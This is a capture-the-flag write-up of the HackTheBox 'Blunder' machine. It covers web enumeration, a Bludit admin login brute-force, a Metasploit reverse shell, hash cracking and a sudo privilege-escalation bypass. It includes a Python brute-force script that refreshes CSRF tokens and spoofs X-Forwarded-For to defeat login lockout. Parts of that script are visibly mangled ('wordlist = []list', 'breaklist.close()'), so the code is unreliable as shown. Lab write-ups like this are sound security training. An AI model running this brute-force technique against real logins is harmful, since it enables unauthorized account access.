---
date: 2020-10-17 12:26:40
layout: post
title: HackTheBox - Blunder
description: Medium Linux Machine containing Memcached Server and Docker Privilege Escalation
image: https://miro.medium.com/max/700/0*QbMsDQ0H57VSiLMA
optimized_image: https://miro.medium.com/max/700/0*QbMsDQ0H57VSiLMA
category: HackTheBox
tags:
  - docker
  - memcache
  - linux
author: anishka
paginate: true
---

Hello Guys , I am <a href="https://twitter.com/_kNgF">Faisal Husaini</a>. My username on HTB is <a href="https://www.hackthebox.eu/home/users/profile/7404">anishka</a>. Also join me on discord.

The IP of this box is **10.10.10.191**

## Port Scan

Running nmap full port scan on it , we get

![placeholder](https://miro.medium.com/max/670/1*IBCorClbNwU_02IHegdnVA.png "Large example image")

Since we have only 1 Open Port which is the web, we directly move onto hunting that part

## Web

Checking the IP on the browser

![placeholder](https://miro.medium.com/max/1000/1*PQ_kW1sIMgTRpfO4oWYXTQ.png "Large example image")

We see its a blog page

Running gobuster for directory fuzzing along with 3 extensions of *php, html and txt*

![placeholder](https://miro.medium.com/max/414/1*rinb49_jemGa-csTHe5K7w.png "Large example image")

We get few results , looking onto the ***/admin*** directory

![placeholder](https://miro.medium.com/max/700/1*jDmG1GJ4TSoaMVKIN3vhIg.png "Large example image")

It redirects to a Bludit login page , trying default credentials gave no luck

Looking onto the ***todo.txt*** file

![placeholder](https://miro.medium.com/max/700/1*U2mlniDfgT2wWo3dCVRLfA.png "Large example image")

I has some todo list , on the last one we can see a potential user ***fergus***

Trying to bruteforce the login using ***ffuf*** or ***hydra*** wont give us success as the login page had bruteforce protection using CSRF Tokens for each login, so we can create a python script and use it for bruteforcing where it grabs new tokens each request

Also ***rockyou.txt*** wordlist file doesnt work here, so I just used cewl on the main blog page as this was something which I did before on similar kind of CTF

```
#!/usr/bin/env python3
import re
import requests

host = 'http://10.10.10.191'
login_url = host + '/admin/login'
username = 'fergus'
wordlist = []list = open("wordlist.txt", "r")

for i in list:
    wordlist.append(i.strip())

for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print('[*] Trying: {p}'.format(p = password))

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            breaklist.close()
```
Running the following script

![placeholder](https://miro.medium.com/max/532/1*mM7u0zcg7bnYxxiYirw5bA.png "Large example image")

We got the password cracked as ***RolandDeschain***

Trying the creds on the login page

![placeholder](https://miro.medium.com/max/1000/1*kKsKQtCQirz0SYO_CD3SIA.png "Large example image")

We got logged in successfully to the dashboard of ***Bludit***

![placeholder](https://miro.medium.com/max/700/1*kNTpXiNYlyDRhWO08z0Z_g.png "Large example image")

We see an exploit available with **Metasploit** , so we directly spawn msf and get to the exploit and set our options

![placeholder](https://miro.medium.com/max/1000/1*8zNBZR7ZFBSCypk7coh2Wg.png "Large example image")

All set ready for exploiting

![placeholder](https://miro.medium.com/max/1000/1*fr_Z4ZPGP4nkIF2EecrhiQ.png "Large example image")

We got meterpreter , we spawn shell and get a proper reverse shell

![placeholder](https://miro.medium.com/max/700/1*WO6aUDJMYnrTmgVHpsywFA.png "Large example image")

We see that the user flag is on user ***Hugo***’s folder and we cant access the flag with the current user ***www-data***

![placeholder](https://miro.medium.com/max/700/1*_1IeJ991trLZ0mVsBfbmHg.png "Large example image")

Digging into the web directories, we find some databases php files which contains usernames and password hash

![placeholder](https://miro.medium.com/max/700/1*eKmBFqR6SLJ21MSPk-ID6g.png "Large example image")

We got the password hash for user ***Hugo*** which is in **SHA1** format if you just do ***hashid*** on it you would know that

![placeholder](https://miro.medium.com/max/700/1*FN4erihVQKAaJbG96GCO9w.png "Large example image")

We cracked the hash using online decryptor and now we switch the user

![placeholder](https://miro.medium.com/max/700/1*G2qcyM32UyiUBFxYPn_Gug.png "Large example image")

We are now user ***hugo*** and now moving further to get the user flag

![placeholder](https://miro.medium.com/max/700/1*J_GtebnYFuFtNlho6r6VyQ.png "Large example image")

## Privilege Escalation

Running the ***sudo -l*** command

![placeholder](https://miro.medium.com/max/700/0*6Rrq3COSzd7iGJ8k.png "Large example image")

We see a weird sudo configuration here , which means we cant run sudo on **/bin/bash** as root with user hugo which we confirm down below

![placeholder](https://miro.medium.com/max/700/1*LOqrU-cnNpLtuS66RKZgIw.png "Large example image")

After doing google searches about the configuration, I see that there is a bypass for this

![placeholder](https://miro.medium.com/max/542/1*s6lzjmsv3iEerAu5OwrzGw.png "Large example image")

We got root! Now time to get the root flag

![placeholder](https://miro.medium.com/max/700/1*ztl3YlHKPUY2KAUoHx_wEA.png "Large example image")



# References

<a href="https://www.exploit-db.com/exploits/47502">sudo 1.8.27 - Security Bypass</a>


<img src="http://www.hackthebox.eu/badge/image/7404" alt="Hack The Box"> 










